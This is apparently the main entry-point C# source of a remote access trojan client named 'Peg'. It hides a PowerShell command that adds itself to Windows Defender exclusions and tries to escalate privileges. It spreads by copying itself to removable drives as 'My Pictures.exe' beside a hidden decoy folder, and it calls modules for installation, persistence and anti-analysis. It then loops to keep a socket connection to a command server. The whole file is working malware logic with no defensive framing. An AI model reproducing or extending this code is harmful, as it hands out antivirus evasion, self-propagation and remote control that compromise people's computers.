using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using Peg.ICARUS;

namespace Peg
{
	public class Program
	{
		public static void Main()
		{
			for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
			{
				Thread.Sleep(1000);
			}
			if (!Settings.InitializeSettings())
			{
				Environment.Exit(0);
			}
			if (Regex.IsMatch(Settings.Exclude, "true"))
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + Process.GetCurrentProcess().MainModule.FileName + " & exit",
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					ErrorDialog = false
				});
			}
			if (Regex.IsMatch(Settings.AlphaOmega, "true") && !new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Sucks.suck(Process.GetCurrentProcess().MainModule.FileName);
			}
			if (Regex.IsMatch(Settings.Aspida, "true"))
			{
				Ektelesths.Run();
			}
			if (Regex.IsMatch(Settings.USB, "true"))
			{
				try
				{
					_ = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\MRT.exe";
					Assembly.GetExecutingAssembly();
					string sourceFileName = Environment.GetCommandLineArgs()[0];
					while (true)
					{
						Thread.Sleep(2522);
						DriveInfo driveInfo = new DriveInfo("C:\\");
						if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "C:\\My Pictures.exe");
								if (File.Exists("C:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("C:\\My Pictures");
										File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo2 = new DriveInfo("D:\\");
						if (driveInfo2.IsReady && driveInfo2.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "D:\\My Pictures.exe");
								if (File.Exists("D:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("D:\\My Pictures");
										File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo3 = new DriveInfo("E:\\");
						if (driveInfo3.IsReady && driveInfo3.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "E:\\My Pictures.exe");
								if (File.Exists("E:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("E:\\My Pictures");
										File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo4 = new DriveInfo("F:\\");
						if (driveInfo4.IsReady && driveInfo4.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "F:\\My Pictures.exe");
								if (File.Exists("F:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("F:\\My Pictures");
										File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo5 = new DriveInfo("G:\\");
						if (driveInfo5.IsReady && driveInfo5.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "G:\\My Pictures.exe");
								if (File.Exists("G:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("G:\\My Pictures");
										File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo6 = new DriveInfo("H:\\");
						if (driveInfo6.IsReady && driveInfo6.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "H:\\My Pictures.exe");
								if (File.Exists("H:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("H:\\My Pictures");
										File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo7 = new DriveInfo("I:\\");
						if (!driveInfo7.IsReady || driveInfo7.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "I:\\My Pictures.exe");
								if (File.Exists("I:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("I:\\My Pictures");
										File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo8 = new DriveInfo("J:\\");
						if (driveInfo8.IsReady && driveInfo8.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "J:\\My Pictures.exe");
								if (File.Exists("J:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("J:\\My Pictures");
										File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo9 = new DriveInfo("K:\\");
						if (driveInfo9.IsReady && driveInfo9.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "K:\\My Pictures.exe");
								if (File.Exists("K:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("K:\\My Pictures");
										File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo10 = new DriveInfo("L:\\");
						if (driveInfo10.IsReady && driveInfo10.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "L:\\My Pictures.exe");
								if (File.Exists("L:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("L:\\My Pictures");
										File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo11 = new DriveInfo("M:\\");
						if (!driveInfo11.IsReady)
						{
							break;
						}
						if (driveInfo11.DriveType == DriveType.Fixed)
						{
							continue;
						}
						try
						{
							File.Copy(sourceFileName, "M:\\My Pictures.exe");
							if (File.Exists("M:\\My Pictures.exe"))
							{
								try
								{
									Directory.CreateDirectory("M:\\My Pictures");
									File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
						break;
					}
				}
				catch
				{
				}
			}
			try
			{
				if (Convert.ToBoolean(Settings.Prostaths))
				{
					Prostaths.Trexa();
				}
				if (!MutexControl.CreateMutex())
				{
					Environment.Exit(0);
				}
				if (Convert.ToBoolean(Settings.ProstathsYlhs))
				{
					ProstathsYlhs.Arxiko();
				}
				if (Convert.ToBoolean(Settings.ODBS) && Me8odos.IsAdmin())
				{
					Prostasia.Set();
				}
				if (Convert.ToBoolean(Settings.Egkatastash))
				{
					Ekinhsh.egkatasthsh();
				}
				Me8odos.PreventSleep();
				if (Me8odos.IsAdmin())
				{
					Me8odos.ClearSetting();
				}
				IMSA.Abyss();
			}
			catch
			{
			}
			while (true)
			{
				try
				{
					if (!PegSock.IsConnected)
					{
						PegSock.Reconnect();
						PegSock.InitializeClient();
					}
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}
	}
}
